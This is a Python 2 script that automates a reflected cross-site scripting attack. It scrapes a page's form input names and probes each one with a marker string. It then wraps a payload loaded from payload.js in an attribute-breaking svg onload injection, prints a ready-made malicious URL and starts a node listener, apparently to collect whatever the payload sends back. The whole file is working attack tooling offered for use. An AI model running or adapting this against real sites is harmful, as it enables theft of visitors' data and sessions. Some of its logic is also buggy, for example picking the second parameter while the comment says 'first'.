import sys
import urllib
import requests
import re
from functools import reduce
from random import choice
from subprocess import Popen, PIPE

test = "6ix8uzz"
headers = {
    'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip',
    'Connection': 'close',
    'DNT': '1',
    'Upgrade-Insecure-Requests': '1',
}

input_reg = '<input.*?name=[\'\"](.*?)[\'\"].*?>'

# contexts where the test input can land in
contexts = [
    {
        "name" : "quotes",
        "match_str" : '<.*=\"({}\d*)\".*>|<.*=\'({}\d*)\'.*>'.format(test, test)
    }
]

# is this the pythonic way ... idk
payload = reduce(lambda x, y : x + y, map(lambda x : x.strip(), open("payload.js").read().split('\n')))
single_quote_payload = "\'><svg onload=\'{}\'".format(payload)
double_quote_payload = "\"><svg onload=\'{}\'".format(payload)

if len(sys.argv) < 2:
    print "usage: python xss.py url"
    sys.exit()

url = sys.argv[1]
if "http://" not in url:
    url = "http://" + url

response = requests.get(url, headers=headers)

# find input elements in the response and get their respective 'name' attributes
# the assumption here is that the GET parameters submitted to the server will have
# the same as the input names
data = {}
params = re.findall(input_reg, response.text)
paramid = 0
for param in params:
    data[param] = test + str(paramid)
    paramid += 1

test_response = requests.get(url, headers=headers, params=data)

# look for test string in the response

final_payloads = {}
for line in test_response.text.split('\n'):
    injection_site = filter(lambda x : x[0], [(re.match(ctx["match_str"], line), ctx["name"]) for ctx in contexts])
    if injection_site:
        # assume that injection contexts are mutually exlcusive; that is above filter expression should only return one result
        # injection_site = next(injection_site, None)
        injection_site = injection_site[0]
        context, name = injection_site
        if name == "quotes":
            double_quote, single_quote = context.group(1,2)
            index = single_quote[-1:] if single_quote else double_quote[-1:]
            param_name = params[int(index)]
            final_payloads[param_name] = single_quote_payload if single_quote else double_quote_payload

# lets just use the first param
param, payload = list(final_payloads.items())[1]
url = url if url[-1:] == '/' else url + '/'
url = url + "?" + param + "=" + payload

print "Copy payload ..."
print "<PAYLOAD>{}<PAYLOAD>".format(url)
print "Starting listening server ..."

try:
    Popen(["node","server.js"], stdin=sys.stdin, stdout=sys.stdout)
    while True:
        continue
except KeyboardInterrupt:
    print "Shutting down listener..."



